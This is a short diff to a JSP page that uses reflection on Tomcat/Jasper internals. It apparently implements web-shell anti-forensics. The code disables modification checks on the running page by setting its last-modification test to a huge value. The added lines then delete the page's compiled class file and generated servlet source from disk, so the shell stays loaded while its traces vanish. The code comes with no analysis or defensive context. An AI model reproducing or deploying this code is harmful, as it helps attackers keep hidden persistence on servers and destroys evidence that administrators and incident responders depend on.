@@ -6,8 +6,11 @@
 <%@ page import="java.util.HashMap" %>
 <%@ page import="java.util.concurrent.ConcurrentHashMap" %>
 <%@ page import="org.apache.jasper.servlet.JspServletWrapper" %>
+<%@ page import="org.apache.jasper.JspCompilationContext" %>
+<%@ page import="java.io.File" %>
 <%@ page contentType="text/html;charset=UTF-8" language="java" %>
 <%
+
     Field requestF = request.getClass().getDeclaredField("request");
     requestF.setAccessible(true);
     Request req = (Request) requestF.get(request);
@@ -27,7 +30,13 @@
     Field jspsF = jspRuntimeContext.getClass().getDeclaredField("jsps");
     jspsF.setAccessible(true);
     ConcurrentHashMap jsps = (ConcurrentHashMap) jspsF.get(jspRuntimeContext);
-
     JspServletWrapper jwrapper = (JspServletWrapper)jsps.get(request.getServletPath());
+    JspCompilationContext ctxt = jwrapper.getJspEngineContext();
     jwrapper.setLastModificationTest(8223372036854775807L);
+
+    File targetFile;
+    targetFile = new File(ctxt.getClassFileName());
+    targetFile.delete();
+    targetFile = new File(ctxt.getServletJavaFileName());
+    targetFile.delete();
 %>
